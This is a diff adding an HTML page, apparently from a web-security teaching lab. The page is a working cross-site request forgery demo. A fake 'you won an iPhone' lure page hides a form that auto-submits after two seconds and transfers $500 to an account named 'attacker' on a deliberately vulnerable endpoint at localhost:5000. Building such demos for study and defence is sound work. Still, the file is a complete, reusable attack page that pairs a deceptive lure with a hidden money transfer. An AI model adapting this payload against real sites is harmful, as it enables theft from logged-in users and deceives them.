@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 Bạn đã trúng thưởng!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 2rem;
+        }
+        h1 { font-size: 3rem; margin-bottom: 1rem; }
+        p { font-size: 1.25rem; opacity: 0.9; }
+        .small { font-size: 0.75rem; opacity: 0.5; margin-top: 2rem; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Chúc mừng bạn!</h1>
+        <p>Bạn đã trúng thưởng 1 chiếc iPhone 99!</p>
+        <p>Vui lòng chờ trong giây lát...</p>
+        <p class="small">(Thực tế: đang gửi CSRF request chuyển $500 đến tài khoản attacker...)</p>
+    </div>
+
+    <!--
+        CSRF Attack Demo
+        This form auto-submits a money transfer request to the vulnerable endpoint.
+        Prerequisites: victim must be logged in at localhost:5000
+    -->
+    <form id="csrf-form" method="POST" action="http://localhost:5000/csrf/vulnerable/transfer" style="display:none;">
+        <input type="hidden" name="to_username" value="attacker">
+        <input type="hidden" name="amount" value="500">
+    </form>
+
+    <script>
+        // Auto-submit after 2 seconds for dramatic effect
+        setTimeout(function() {
+            document.getElementById('csrf-form').submit();
+        }, 2000);
+    </script>
+</body>
+</html>
